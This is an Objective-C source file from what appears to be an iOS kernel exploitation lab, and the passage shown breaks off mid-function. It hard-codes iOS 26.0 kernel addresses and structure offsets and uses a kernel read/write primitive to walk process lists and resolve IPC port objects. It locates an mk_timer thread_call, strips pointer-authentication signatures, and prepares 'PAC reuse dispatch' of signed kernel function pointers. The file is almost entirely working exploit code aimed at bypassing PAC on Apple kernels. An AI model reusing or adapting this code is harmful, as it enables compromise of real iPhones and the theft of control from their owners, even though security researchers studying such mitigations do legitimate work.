#import "CNDLabThreadCallPACBoundary.h"

#import "kexploit/CNDLabKernelPAC.h"
#import "kexploit/CNDLabKernelProvider.h"

#include <errno.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/* These libc stubs are exported on iOS but omitted from the public SDK. */
extern mach_port_name_t mk_timer_create(void);
extern kern_return_t mk_timer_destroy(mach_port_name_t name);
extern kern_return_t mk_timer_arm(mach_port_name_t name,
    uint64_t expire_time);
extern kern_return_t mk_timer_cancel(mach_port_name_t name,
    uint64_t *result_time);

/* Exact iOS 26.0 / 23A341 vPhone layout recovered from the shipped kernel. */
static const uint64_t CNDStaticMkTimerExpire = UINT64_C(0xfffffe0007b19bb4);
static const uint64_t CNDStaticAllProc = UINT64_C(0xfffffe0009813020);
static const uint64_t CNDVMZoneAddressMin = UINT64_C(0xfffffe1000000000);
static const uint64_t CNDVMZoneAddressMax = UINT64_C(0xfffffe3fffffffff);
static const uint64_t CNDProcNextOffset = UINT64_C(0x0);
static const uint64_t CNDProcROOffset = UINT64_C(0x18);
static const uint64_t CNDProcPIDOffset = UINT64_C(0x60);
static const uint64_t CNDProcROTaskOffset = UINT64_C(0x8);
static const uint64_t CNDTaskIPCSpaceOffset = UINT64_C(0x310);
static const uint64_t CNDIPCSpaceTableOffset = UINT64_C(0x48);
static const uint64_t CNDIPCEntrySize = UINT64_C(0x18);
static const uint64_t CNDIPCEntryObjectOffset = UINT64_C(0x0);
static const uint32_t CNDMaximumProcWalk = 1024;
static const uint64_t CNDMkTimerThreadCallOffset = UINT64_C(0x10);
static const uint64_t CNDMkTimerTCQueueOffset = UINT64_C(0x38);
static const uint64_t CNDMkTimerFlagsOffset = UINT64_C(0x52);
static const uint64_t CNDMkTimerCallbackOffset = UINT64_C(0x68);
static const uint64_t CNDMkTimerParam0Offset = UINT64_C(0x70);
static const uint64_t CNDMkTimerParam1Offset = UINT64_C(0x78);
static const uint64_t CNDMkTimerSchedulerState0Offset = UINT64_C(0x80);
static const uint64_t CNDMkTimerSchedulerState1Offset = UINT64_C(0x88);
static const uint64_t CNDMkTimerIsDeadOffset = UINT64_C(0x90);
static const uint64_t CNDMkTimerIsArmedOffset = UINT64_C(0x91);
static const uint64_t CNDMkTimerActiveOffset = UINT64_C(0x94);
static const uint64_t CNDMkTimerPortOffset = UINT64_C(0x98);
static const uint64_t CNDMkTimerPreallocOffset = UINT64_C(0xa0);
static const size_t CNDMkTimerObservedSize = 0xa8;
static const uint16_t CNDThreadCallInitialized = 0x0200;
static const uint16_t CNDThreadCallBusyMask = 0x000c;
static const uint8_t CNDShippedTimerPortType = 8;
static const uint64_t CNDThreadCallParam1MutationCanary =
    UINT64_C(0x434e445041434d31); /* "CNDPACM1" */
static const uint64_t CNDThreadCallPACReuseX0Canary =
    UINT64_C(0x434e445041435830); /* "CNDPACX0" */
static const uint64_t CNDStaticBRAAZAdapter =
    UINT64_C(0xfffffe00080a0710);
static const uint64_t CNDStaticBRAAZAdapterObjectGlobal =
    UINT64_C(0xfffffe0009846d20);
static const uint64_t CNDStaticIAZeroTarget =
    UINT64_C(0xfffffe0007e3613c);
static const uint64_t CNDStaticIAZeroObjectGlobal =
    UINT64_C(0xfffffe000983f988);
static const uint64_t CNDStaticIAZeroGate =
    UINT64_C(0xfffffe000983f981);
static const uint64_t CNDStaticIAZeroActivation0 =
    UINT64_C(0xfffffe000983f960);
static const uint64_t CNDStaticIAZeroActivation1 =
    UINT64_C(0xfffffe000983f964);
static const uint64_t CNDStaticRootDomainGlobal =
    UINT64_C(0xfffffe0009816ce0);
static const uint64_t CNDStaticPMDriverCallout =
    UINT64_C(0xfffffe00081ddc40);
static const uint64_t CNDStaticIOUserServerSetPowerState =
    UINT64_C(0xfffffe0008271fa4);
static const uint64_t CNDStaticAppleM68ButtonsSetPowerState =
    UINT64_C(0xfffffe0008611dbc);
static const uint64_t CNDStaticIOKitDebugByte =
    UINT64_C(0xfffffe0007757960);
static const uint64_t CNDIOServicePortKobjectOffset = UINT64_C(0x50);
static const uint64_t CNDIOServicePortKobjectInnerOffset = UINT64_C(0x20);
static const uint64_t CNDThreadCallFunctionOffset = UINT64_C(0x58);
static const uint64_t CNDThreadCallParam0FieldOffset = UINT64_C(0x60);
static const uint64_t CNDPMServicePwrMgtOffset = UINT64_C(0x60);
static const uint64_t CNDPMServiceInitializedOffset = UINT64_C(0x68);
static const uint64_t CNDPMFlagsOffset = UINT64_C(0xe0);
static const uint64_t CNDPMHeadNotePowerStateOffset = UINT64_C(0xa0);
static const uint64_t CNDPMControllingDriverOffset = UINT64_C(0x158);
static const uint64_t CNDPMDriverCallEntryOffset = UINT64_C(0x1c8);
static const uint64_t CNDPMDriverCallParamOffset = UINT64_C(0x1d0);
static const uint64_t CNDPMDriverCallCountSlotsOffset = UINT64_C(0x1d8);
static const uint64_t CNDPMDriverCallReasonOffset = UINT64_C(0x1e0);
static const uint64_t CNDPMDriverCallResultOffset = UINT64_C(0x8);
static const uint64_t CNDPMOperationListHeadOffset = UINT64_C(0x230);
static const uint64_t CNDPMOperationListTailOffset = UINT64_C(0x238);
static const uint64_t CNDPMOperationThreadOffset = UINT64_C(0x10);
static const uint64_t CNDPMOperationDriverOffset = UINT64_C(0x18);
static const uint64_t CNDPMOperationTargetOffset = UINT64_C(0x20);
static const size_t CNDPMOperationObservedSize = 0x28;
static const uint16_t CNDPMDriverCallBusyMask = 0x0200;
static const uint32_t CNDPMDriverCallReasonSetPowerState = 2;
static const uint64_t CNDThreadCallDispatchDelayNanoseconds =
    UINT64_C(1000000000);
static const uint64_t CNDThreadCallCrossClassDispatchDelayNanoseconds =
    UINT64_C(50000000);
static const uint64_t CNDThreadCallDispatchTimeoutNanoseconds =
    UINT64_C(4000000000);
static const useconds_t CNDThreadCallDispatchPollMicroseconds = 1000;
static const useconds_t CNDThreadCallPACReuseSettleMicroseconds = 100000;

typedef NS_ENUM(uint8_t, CNDLabThreadCallPACBoundaryMode) {
    CNDLabThreadCallPACBoundaryModeReadOnly = 0,
    CNDLabThreadCallPACBoundaryModeReversibleMutation = 1,
    CNDLabThreadCallPACBoundaryModeOriginalCallbackDispatch = 2,
    CNDLabThreadCallPACBoundaryModePACReuseDispatch = 3,
};

typedef NS_ENUM(uint8_t, CNDLabPMCalloutTargetMode) {
    CNDLabPMCalloutTargetModeRootDomain = 0,
    CNDLabPMCalloutTargetModeIOUserServer = 1,
    CNDLabPMCalloutTargetModeAppleM68Buttons = 2,
};

static volatile int32_t gCNDLabThreadCallPACBoundaryRunning;

static void CNDLabThreadCallPACBoundaryRunMode(
    CNDLabThreadCallPACBoundaryMode mode,
    CNDLabThreadCallPACBoundaryCompletion completion);

static NSString *CNDLabThreadCallHex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static BOOL CNDLabThreadCallKernelAddress(uint64_t value)
{
    return (value & UINT64_C(0xffff000000000000)) ==
        UINT64_C(0xffff000000000000);
}

static BOOL CNDLabThreadCallKernelObjectAddress(uint64_t value)
{
    return value >= CNDVMZoneAddressMin &&
        value <= CNDVMZoneAddressMax && (value & 7) == 0;
}

#if defined(__arm64__)
__attribute__((naked))
static uint64_t CNDLabThreadCallStripInstructionPAC(uint64_t value)
{
    __asm__ volatile(".long 0xdac143e0"); /* xpaci x0 */
    __asm__ volatile("ret");
}

__attribute__((naked))
static uint64_t CNDLabThreadCallStripDataPAC(uint64_t value)
{
    __asm__ volatile(".long 0xdac147e0"); /* xpacd x0 */
    __asm__ volatile("ret");
}
#else
static uint64_t CNDLabThreadCallCanonicalPointer(uint64_t value)
{
    value &= UINT64_C(0x0000ffffffffffff);
    if ((value & UINT64_C(0x0000800000000000)) != 0) {
        value |= UINT64_C(0xffff000000000000);
    }
    return value;
}

static uint64_t CNDLabThreadCallStripInstructionPAC(uint64_t value)
{
    return CNDLabThreadCallCanonicalPointer(value);
}

static uint64_t CNDLabThreadCallStripDataPAC(uint64_t value)
{
    return CNDLabThreadCallCanonicalPointer(value);
}
#endif

static uint16_t CNDLabThreadCallRead16(const uint8_t *bytes, size_t offset)
{
    uint16_t value = 0;
    memcpy(&value, bytes + offset, sizeof(value));
    return value;
}

static uint32_t CNDLabThreadCallRead32(const uint8_t *bytes, size_t offset)
{
    uint32_t value = 0;
    memcpy(&value, bytes + offset, sizeof(value));
    return value;
}

static uint64_t CNDLabThreadCallRead64(const uint8_t *bytes, size_t offset)
{
    uint64_t value = 0;
    memcpy(&value, bytes + offset, sizeof(value));
    return value;
}

static uint64_t CNDLabThreadCallDeadlineAfterNanoseconds(
    uint64_t nanoseconds)
{
    mach_timebase_info_data_t timebase = {0};
    if (mach_timebase_info(&timebase) != KERN_SUCCESS ||
        timebase.numer == 0 || timebase.denom == 0) return 0;
    __uint128_t scaled = (__uint128_t)nanoseconds * timebase.denom;
    uint64_t ticks = (uint64_t)((scaled + timebase.numer - 1) /
        timebase.numer);
    uint64_t now = mach_absolute_time();
    if (UINT64_MAX - now < ticks) return 0;
    return now + ticks;
}

typedef struct {
    uint32_t visited;
    uint64_t first_raw_next;
    uint64_t first_next;
    uint64_t last_proc;
} CNDLabProcWalkObservation;

typedef struct {
    mach_msg_header_t header;
    uint8_t body[1024];
} CNDLabTimerExpirationMessage;

typedef mach_port_t CNDIOObject;
typedef CNDIOObject CNDIOIterator;
typedef CNDIOObject CNDIOService;
typedef CFMutableDictionaryRef (*CNDIOServiceMatchingFn)(const char *name);
typedef kern_return_t (*CNDIOServiceGetMatchingServicesFn)(
    mach_port_t mainPort, CFDictionaryRef matching,
    CNDIOIterator *iterator);
typedef CNDIOObject (*CNDIOIteratorNextFn)(CNDIOIterator iterator);
typedef kern_return_t (*CNDIOObjectReleaseFn)(CNDIOObject object);

static uint64_t CNDLabThreadCallFindProcess(
    uint64_t allprocHead, pid_t wantedPID,
    CNDLabProcWalkObservation *observation)
{
    CNDLabProcWalkObservation local = {0};
    uint64_t proc = CNDLabThreadCallStripDataPAC(allprocHead);
    for (uint32_t index = 0; index < CNDMaximumProcWalk; index++) {
        if (!CNDLabThreadCallKernelObjectAddress(proc)) break;

        uint8_t header[CNDProcPIDOffset + sizeof(uint32_t)] = {0};
        if (!cnd_lab_krw_read(proc, header, sizeof(header))) break;
        local.visited++;
        local.last_proc = proc;
        uint32_t pid = CNDLabThreadCallRead32(
            header, (size_t)CNDProcPIDOffset);
        if (pid == (uint32_t)wantedPID) {
            if (observation) *observation = local;
            return proc;
        }

        uint64_t rawNext = CNDLabThreadCallRead64(
            header, (size_t)CNDProcNextOffset);
        uint64_t next = CNDLabThreadCallStripDataPAC(rawNext);
        if (index == 0) {
            local.first_raw_next = rawNext;
            local.first_next = next;
        }
        if (!next || next == proc ||
            !CNDLabThreadCallKernelObjectAddress(next)) break;
        proc = next;
    }
    if (observation) *observation = local;
    return 0;
}

static BOOL CNDLabThreadCallReadDataPointer(
    uint64_t address, uint64_t *rawOut, uint64_t *pointerOut)
{
    uint64_t raw = 0;
    if (!cnd_lab_krw_read(address, &raw, sizeof(raw))) return NO;
    uint64_t pointer = CNDLabThreadCallStripDataPAC(raw);
    if (rawOut) *rawOut = raw;
    if (pointerOut) *pointerOut = pointer;
    return CNDLabThreadCallKernelObjectAddress(pointer);
}

static uint64_t CNDLabThreadCallTaskForProcess(
    uint64_t proc, uint64_t *rawProcROOut, uint64_t *procROOut,
    uint64_t *rawTaskOut)
{
    uint64_t rawProcRO = 0;
    uint64_t procRO = 0;
    if (!CNDLabThreadCallReadDataPointer(
            proc + CNDProcROOffset, &rawProcRO, &procRO)) return 0;
    uint64_t rawTask = 0;
    uint64_t task = 0;
    if (!CNDLabThreadCallReadDataPointer(
            procRO + CNDProcROTaskOffset, &rawTask, &task)) return 0;
    if (rawProcROOut) *rawProcROOut = rawProcRO;
    if (procROOut) *procROOut = procRO;
    if (rawTaskOut) *rawTaskOut = rawTask;
    return task;
}

static uint64_t CNDLabThreadCallPortObject(
    uint64_t task, mach_port_name_t name,
    uint64_t *rawSpaceOut, uint64_t *spaceOut,
    uint64_t *rawTableOut, uint64_t *tableOut,
    uint64_t *entryOut, uint64_t *rawObjectOut)
{
    uint64_t rawSpace = 0;
    uint64_t space = 0;
    if (!CNDLabThreadCallReadDataPointer(
            task + CNDTaskIPCSpaceOffset, &rawSpace, &space)) return 0;

    uint64_t rawTable = 0;
    if (!cnd_lab_krw_read(
            space + CNDIPCSpaceTableOffset,
            &rawTable, sizeof(rawTable))) {
        if (rawSpaceOut) *rawSpaceOut = rawSpace;
        if (spaceOut) *spaceOut = space;
        if (rawTableOut) *rawTableOut = rawTable;
        if (tableOut) *tableOut = 0;
        return 0;
    }
    uint64_t table = CNDLabThreadCallStripDataPAC(rawTable);
    table &= ~UINT64_C(0x1f);
    if (!CNDLabThreadCallKernelObjectAddress(table)) {
        if (rawSpaceOut) *rawSpaceOut = rawSpace;
        if (spaceOut) *spaceOut = space;
        if (rawTableOut) *rawTableOut = rawTable;
        if (tableOut) *tableOut = table;
        return 0;
    }

    uint64_t index = (uint64_t)name >> 8;
    if (index > (UINT64_MAX - table) / CNDIPCEntrySize) return 0;
    uint64_t entry = table + index * CNDIPCEntrySize;
    if (!CNDLabThreadCallKernelObjectAddress(entry)) return 0;

    uint64_t rawObject = 0;
    uint64_t object = 0;
    if (!CNDLabThreadCallReadDataPointer(
            entry + CNDIPCEntryObjectOffset, &rawObject, &object)) {
        object = 0;
    }
    if (rawSpaceOut) *rawSpaceOut = rawSpace;
    if (spaceOut) *spaceOut = space;
    if (rawTableOut) *rawTableOut = rawTable;
    if (tableOut) *tableOut = table;
    if (entryOut) *entryOut = entry;
    if (rawObjectOut) *rawObjectOut = rawObject;
    return object;
}

static BOOL CNDLabThreadCallCopyIOServiceObject(
    uint64_t task, const char *className, uint64_t expectedSetPowerState,
    CNDIOService *retainedServiceOut, uint64_t *objectOut,
    uint64_t *rawVtableOut, uint64_t *vtableOut,
    uint64_t *rawSetPowerStateOut)
{
    if (retainedServiceOut) *retainedServiceOut = MACH_PORT_NULL;
    if (objectOut) *objectOut = 0;
    if (rawVtableOut) *rawVtableOut = 0;
    if (vtableOut) *vtableOut = 0;
    if (rawSetPowerStateOut) *rawSetPowerStateOut = 0;

    void *iokit = dlopen(
        "/System/Library/Frameworks/IOKit.framework/IOKit",
        RTLD_NOW | RTLD_LOCAL);
    if (!iokit) return NO;
    CNDIOServiceMatchingFn serviceMatching =
        (CNDIOServiceMatchingFn)dlsym(iokit, "IOServiceMatching");
    CNDIOServiceGetMatchingServicesFn getMatchingServices =
        (CNDIOServiceGetMatchingServicesFn)dlsym(
            iokit, "IOServiceGetMatchingServices");
    CNDIOIteratorNextFn iteratorNext =
        (CNDIOIteratorNextFn)dlsym(iokit, "IOIteratorNext");
    CNDIOObjectReleaseFn objectRelease =
        (CNDIOObjectReleaseFn)dlsym(iokit, "IOObjectRelease");
    if (!serviceMatching || !getMatchingServices ||
        !iteratorNext || !objectRelease) {
        dlclose(iokit);
        return NO;
    }

    CFMutableDictionaryRef matching = serviceMatching(className);
    CNDIOIterator iterator = MACH_PORT_NULL;
    kern_return_t matchingKR = matching
        ? getMatchingServices(MACH_PORT_NULL, matching, &iterator)
        : KERN_FAILURE;
    if (matchingKR != KERN_SUCCESS || !MACH_PORT_VALID(iterator)) {
        dlclose(iokit);
        return NO;
    }

    BOOL found = NO;
    CNDIOService retainedService = MACH_PORT_NULL;
    uint64_t foundObject = 0;
    uint64_t foundRawVtable = 0;
    uint64_t foundVtable = 0;
    uint64_t foundRawMethod = 0;
    for (uint32_t index = 0; index < 128; index++) {
        CNDIOService service = iteratorNext(iterator);
        if (!MACH_PORT_VALID(service)) break;
        uint64_t port = CNDLabThreadCallPortObject(
            task, service, NULL, NULL, NULL, NULL, NULL, NULL);
        uint64_t wrapper = 0;
        uint64_t object = 0;
        uint64_t rawVtable = 0;
        uint64_t rawMethod = 0;
        uint64_t vtable = 0;
        uint64_t method = 0;
        BOOL exact = CNDLabThreadCallReadDataPointer(
                port + CNDIOServicePortKobjectOffset,
                NULL, &wrapper) &&
            CNDLabThreadCallReadDataPointer(
                wrapper + CNDIOServicePortKobjectInnerOffset,
                NULL, &object) &&
            cnd_lab_krw_read(object, &rawVtable,
                sizeof(rawVtable));
        if (exact) {
            vtable = CNDLabThreadCallStripDataPAC(rawVtable);
            exact = CNDLabThreadCallKernelAddress(vtable) &&
                cnd_lab_krw_read(vtable + UINT64_C(0x4d8),
                    &rawMethod, sizeof(rawMethod));
        }
        if (exact) {
            method = CNDLabThreadCallStripInstructionPAC(rawMethod);
            exact = method == expectedSetPowerState &&
                rawVtable != vtable && rawMethod != method;
        }
        if (exact) {
            retainedService = service;
            foundObject = object;
            foundRawVtable = rawVtable;
            foundVtable = vtable;
            foundRawMethod = rawMethod;
            found = YES;
            break;
        }
        objectRelease(service);
    }
    objectRelease(iterator);
    dlclose(iokit);

    if (!found) return NO;
    if (retainedServiceOut) *retainedServiceOut = retainedService;
    if (objectOut) *objectOut = foundObject;
    if (rawVtableOut) *rawVtableOut = foundRawVtable;
    if (vtableOut) *vtableOut = foundVtable;
    if (rawSetPowerStateOut) *rawSetPowerStateOut = foundRawMethod;
    return YES;
}

static NSDictionary<NSString *, id> *CNDLabThreadCallPACBoundaryRunOnce(
    CNDLabThreadCallPACBoundaryMode mode)
{
    BOOL reversibleMutation =
        mode != CNDLabThreadCallPACBoundaryModeReadOnly;
    BOOL dispatchOriginalCallback =
        mode == CNDLabThreadCallPACBoundaryModeOriginalCallbackDispatch;
    BOOL dispatchPACReuse =
        mode == CNDLabThreadCallPACBoundaryModePACReuseDispatch;
    NSString *modeName = @"read-only-observation";
    if (dispatchPACReuse) {
        modeName = @"two-stage-pac-reuse-dispatch";
    } else if (dispatchOriginalCallback) {
        modeName = @"original-signed-callback-dispatch";
    } else if (reversibleMutation) {
        modeName = @"reversible-unsigned-argument-mutation";
    }
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schemaVersion": @1,
        @"probe": @"mk-timer-thread-call-pac-boundary",
        @"kernelUUID": @CND_LAB_PAC_KERNEL_UUID,
        @"reaEvidence": @"ev_422c1707c90a42b63dd4a7c6a7dc5c233e40055574f8a4305fd12f4fcbcd6630",
        @"allprocREAEvidence": @"ev_060e9c17a5b2806c1f7f39c92369c8755bd015728e56dd954f76eab1eb54bfdc",
        @"mode": modeName,
        @"readOnly": @(!reversibleMutation),
        @"reversibleMutation": @(reversibleMutation),
        @"dispatchOriginalCallback": @(dispatchOriginalCallback),
        @"dispatchPACReuse": @(dispatchPACReuse),
        @"usedKernelWrite": @NO,
        @"usedKernelCall": @NO,
        @"armedTimer": @NO,
        @"callbackDispatched": @NO,
        @"result": @"failed-before-create",
    } mutableCopy];

    CNDLabPACProfile profile = {0};
    if (!cnd_lab_vphone_guest() || !cnd_lab_krw_ready() ||
        !cnd_lab_kernel_rw_active() ||
        !cnd_lab_pac_identity_profile(&profile)) {
        report[@"result"] = @"refused-unverified-lab-profile";
        report[@"message"] = @"The exact read-only VM KRW/PAC identity profile was not available.";
        return [report copy];
    }
    report[@"kernelBase"] = CNDLabThreadCallHex(profile.kernel_base);
    report[@"kernelSlide"] = CNDLabThreadCallHex(profile.kernel_slide);

    report[@"vmZoneAddressMin"] = CNDLabThreadCallHex(
        CNDVMZoneAddressMin);
    report[@"vmZoneAddressMax"] = CNDLabThreadCallHex(
        CNDVMZoneAddressMax);

    mach_port_name_t timerPort = mk_timer_create();
    if (!MACH_PORT_VALID(timerPort)) {
        report[@"result"] = @"mk-timer-create-failed";
        report[@"message"] = @"mk_timer_create returned an invalid name.";
        return [report copy];
    }
    report[@"timerPortName"] = @((uint32_t)timerPort);

    __block BOOL mutationOutstanding = NO;
    __block uint64_t mutationAddress = 0;
    __block uint64_t mutationOriginalValue = 0;
    __block BOOL timerMayBeArmed = NO;
    __block uint64_t timerObjectAddress = 0;
    __block BOOL pacReuseFieldsOutstanding = NO;
    __block BOOL pacReuseQueueDrained = NO;
    __block uint64_t pacReuseCallbackAddress = 0;
    __block uint64_t pacReuseParam0Address = 0;
    __block uint64_t pacReuseParam1Address = 0;
    __block uint64_t pacReuseOriginalCallback = 0;
    __block uint64_t pacReuseOriginalParam0 = 0;
    __block uint64_t pacReuseOriginalParam1 = 0;

    @try {
      do {
        uint64_t allprocSymbol = CNDStaticAllProc + profile.kernel_slide;
        uint64_t allprocHead = 0;
        BOOL allprocRead = cnd_lab_krw_read(
            allprocSymbol, &allprocHead, sizeof(allprocHead));
        CNDLabProcWalkObservation walk = {0};
        uint64_t selfProc = allprocRead
            ? CNDLabThreadCallFindProcess(allprocHead, getpid(), &walk) : 0;
        report[@"allprocSymbol"] = CNDLabThreadCallHex(allprocSymbol);
        report[@"allprocHead"] = CNDLabThreadCallHex(allprocHead);
        report[@"procWalkCount"] = @(walk.visited);
        report[@"procWalkFirstRawNext"] = CNDLabThreadCallHex(
            walk.first_raw_next);
        report[@"procWalkFirstNext"] = CNDLabThreadCallHex(
            walk.first_next);
        report[@"procWalkLastProc"] = CNDLabThreadCallHex(walk.last_proc);
        report[@"selfProcRecovered"] = @(selfProc != 0);
        report[@"selfProc"] = CNDLabThreadCallHex(selfProc);
        if (!selfProc) {
            report[@"result"] = @"self-task-recovery-failed";
            report[@"message"] = @"The bounded forward-only allproc walk did not find Cyanide's live PID; no reverse sentinel traversal was attempted.";
            break;
        }

        uint64_t rawProcRO = 0;
        uint64_t procRO = 0;
        uint64_t rawTask = 0;
        uint64_t selfTask = CNDLabThreadCallTaskForProcess(
            selfProc, &rawProcRO, &procRO, &rawTask);
        report[@"rawProcRO"] = CNDLabThreadCallHex(rawProcRO);
        report[@"procRO"] = CNDLabThreadCallHex(procRO);
        report[@"rawSelfTask"] = CNDLabThreadCallHex(rawTask);

        uint64_t rawSpace = 0;
        uint64_t ipcSpace = 0;
        uint64_t rawTable = 0;
        uint64_t ipcTable = 0;
        uint64_t ipcEntry = 0;
        uint64_t rawPortObject = 0;
        uint64_t portObject = selfTask != 0
            ? CNDLabThreadCallPortObject(
                selfTask, timerPort, &rawSpace, &ipcSpace,
                &rawTable, &ipcTable, &ipcEntry, &rawPortObject)
            : 0;
        report[@"selfTask"] = CNDLabThreadCallHex(selfTask);
        report[@"rawIPCSpace"] = CNDLabThreadCallHex(rawSpace);
        report[@"ipcSpace"] = CNDLabThreadCallHex(ipcSpace);
        report[@"rawIPCTable"] = CNDLabThreadCallHex(rawTable);
        report[@"ipcTable"] = CNDLabThreadCallHex(ipcTable);
        report[@"ipcEntry"] = CNDLabThreadCallHex(ipcEntry);
        report[@"rawPortObject"] = CNDLabThreadCallHex(rawPortObject);
        report[@"portObject"] = CNDLabThreadCallHex(portObject);
        if (!CNDLabThreadCallKernelAddress(selfTask) ||
            !CNDLabThreadCallKernelAddress(portObject)) {
            report[@"result"] = @"ipc-object-resolution-failed";
            report[@"message"] = @"KRW could not bind the timer name to its exact ipc_port.";
            break;
        }

        uint8_t portHeader[16] = {0};
        if (!cnd_lab_krw_read(portObject, portHeader, sizeof(portHeader))) {
            report[@"result"] = @"ipc-object-read-failed";
            report[@"message"] = @"The timer ipc_port header could not be read.";
            break;
        }
        uint32_t ioBits = CNDLabThreadCallRead32(portHeader, 0);
        uint64_t signedLabel = CNDLabThreadCallRead64(portHeader, 8);
        uint64_t timerObject = CNDLabThreadCallStripDataPAC(signedLabel);
        timerObjectAddress = timerObject;
        uint8_t ioType = portHeader[0];
        report[@"ioBits"] = [NSString stringWithFormat:@"0x%08x", ioBits];
        report[@"ioType"] = @(ioType);
        report[@"signedTimerLabel"] = CNDLabThreadCallHex(signedLabel);
        report[@"timerObject"] = CNDLabThreadCallHex(timerObject);
        report[@"timerLabelHasDataPAC"] = @(signedLabel != timerObject);
        if (ioType != CNDShippedTimerPortType ||
            !CNDLabThreadCallKernelAddress(timerObject)) {
            report[@"result"] = @"timer-label-validation-failed";
            report[@"message"] = @"The port was not the shipped timer type or its dPAC label did not strip to a kernel pointer.";
            break;
        }

        uint8_t timer[CNDMkTimerObservedSize] = {0};
        if (!cnd_lab_krw_read(timerObject, timer, sizeof(timer))) {
            report[@"result"] = @"timer-object-read-failed";
            report[@"message"] = @"The kernel-owned timer object could not be read.";
            break;
        }

        uint16_t flags = CNDLabThreadCallRead16(
            timer, (size_t)CNDMkTimerFlagsOffset);
        uint64_t signedCallback = CNDLabThreadCallRead64(
            timer, (size_t)CNDMkTimerCallbackOffset);
        uint64_t callback = CNDLabThreadCallStripInstructionPAC(
            signedCallback);
        uint64_t param0 = CNDLabThreadCallRead64(
            timer, (size_t)CNDMkTimerParam0Offset);
        uint64_t param1 = CNDLabThreadCallRead64(
            timer, (size_t)CNDMkTimerParam1Offset);
        uint64_t schedulerState0 = CNDLabThreadCallRead64(
            timer, (size_t)CNDMkTimerSchedulerState0Offset);
        uint64_t schedulerState1 = CNDLabThreadCallRead64(
            timer, (size_t)CNDMkTimerSchedulerState1Offset);
        uint8_t isDead = timer[CNDMkTimerIsDeadOffset];
        uint8_t isArmed = timer[CNDMkTimerIsArmedOffset];
        uint32_t active = CNDLabThreadCallRead32(
            timer, (size_t)CNDMkTimerActiveOffset);
        uint64_t signedPort = CNDLabThreadCallRead64(
            timer, (size_t)CNDMkTimerPortOffset);
        uint64_t timerPortObject = CNDLabThreadCallStripDataPAC(signedPort);
        uint64_t signedPrealloc = CNDLabThreadCallRead64(
            timer, (size_t)CNDMkTimerPreallocOffset);
        uint64_t prealloc = CNDLabThreadCallStripDataPAC(signedPrealloc);
        uint64_t expectedCallback = CNDStaticMkTimerExpire +
            profile.kernel_slide;

        report[@"threadCallOffset"] = CNDLabThreadCallHex(
            CNDMkTimerThreadCallOffset);
        report[@"threadCallFlags"] = [NSString stringWithFormat:
            @"0x%04x", flags];
        report[@"signedCallback"] = CNDLabThreadCallHex(signedCallback);
        report[@"callback"] = CNDLabThreadCallHex(callback);
        report[@"expectedCallback"] = CNDLabThreadCallHex(expectedCallback);
        report[@"callbackHasInstructionPAC"] = @(
            signedCallback != callback);
        report[@"param0"] = CNDLabThreadCallHex(param0);
        report[@"param1"] = CNDLabThreadCallHex(param1);
        report[@"schedulerState0"] = @(schedulerState0);
        report[@"schedulerState1"] = @(schedulerState1);
        report[@"isDead"] = @(isDead);
        report[@"isArmed"] = @(isArmed);
        report[@"active"] = @(active);
        report[@"signedPortBacklink"] = CNDLabThreadCallHex(signedPort);
        report[@"portBacklink"] = CNDLabThreadCallHex(timerPortObject);
        report[@"signedPrealloc"] = CNDLabThreadCallHex(signedPrealloc);
        report[@"prealloc"] = CNDLabThreadCallHex(prealloc);

        BOOL exactIdleThreadCall =
            flags == CNDThreadCallInitialized &&
            (flags & CNDThreadCallBusyMask) == 0 &&
            callback == expectedCallback &&
            signedCallback != callback &&
            param0 == timerObject && param1 == 0 &&
            schedulerState0 == 0 && schedulerState1 == 0;
        BOOL exactIdleTimer = isDead == 0 && isArmed == 0 && active == 0;
        BOOL exactOwnership = timerPortObject == portObject &&
            signedPort != timerPortObject &&
            CNDLabThreadCallKernelAddress(prealloc);
        BOOL exactBoundary = exactIdleThreadCall && exactIdleTimer &&
            exactOwnership;
        report[@"exactIdleThreadCall"] = @(exactIdleThreadCall);
        report[@"exactIdleTimer"] = @(exactIdleTimer);
        report[@"exactOwnership"] = @(exactOwnership);
        report[@"exactReadOnlyBoundary"] = @(exactBoundary);
        report[@"result"] = exactBoundary
            ? @"exact-read-only-boundary-observed"
            : @"layout-or-identity-mismatch";
        report[@"message"] = exactBoundary
            ? @"Observed the exact idle mk_timer/thread_call PAC boundary without arming or mutating it."
            : @"At least one shipped-layout, PAC, ownership, or idle-state assertion failed.";

        if (dispatchPACReuse && exactBoundary) {
            uint64_t adapterGlobal =
                CNDStaticBRAAZAdapterObjectGlobal + profile.kernel_slide;
            uint64_t targetGlobal =
                CNDStaticIAZeroObjectGlobal + profile.kernel_slide;
            uint64_t rawAdapterObject = 0;
            uint64_t adapterObject = 0;
            uint64_t rawTargetObject = 0;
            uint64_t targetObject = 0;
            BOOL adapterObjectRead = CNDLabThreadCallReadDataPointer(
                adapterGlobal, &rawAdapterObject, &adapterObject);
            BOOL targetObjectRead = CNDLabThreadCallReadDataPointer(
                targetGlobal, &rawTargetObject, &targetObject);

            uint64_t signedAdapter = 0;
            uint64_t signedTarget = 0;
            BOOL signedAdapterRead = adapterObjectRead && cnd_lab_krw_read(
                adapterObject + CNDThreadCallFunctionOffset,
                &signedAdapter, sizeof(signedAdapter));
            BOOL signedTargetRead = targetObjectRead && cnd_lab_krw_read(
                targetObject + CNDThreadCallParam0FieldOffset,
                &signedTarget, sizeof(signedTarget));
            uint64_t strippedAdapter = CNDLabThreadCallStripInstructionPAC(
                signedAdapter);
            uint64_t strippedTarget = CNDLabThreadCallStripInstructionPAC(
                signedTarget);
            uint64_t expectedAdapter =
                CNDStaticBRAAZAdapter + profile.kernel_slide;
            uint64_t expectedTarget =
                CNDStaticIAZeroTarget + profile.kernel_slide;

            uint64_t gateAddress =
                CNDStaticIAZeroGate + profile.kernel_slide;
            uint64_t activation0Address =
                CNDStaticIAZeroActivation0 + profile.kernel_slide;
            uint64_t activation1Address =
                CNDStaticIAZeroActivation1 + profile.kernel_slide;
            uint8_t gate = UINT8_MAX;
            uint8_t activation0 = UINT8_MAX;
            uint8_t activation1 = UINT8_MAX;
            BOOL gatesReadable = cnd_lab_krw_read(
                    gateAddress, &gate, sizeof(gate)) &&
                cnd_lab_krw_read(
                    activation0Address, &activation0,
                    sizeof(activation0)) &&
                cnd_lab_krw_read(
                    activation1Address, &activation1,
                    sizeof(activation1));
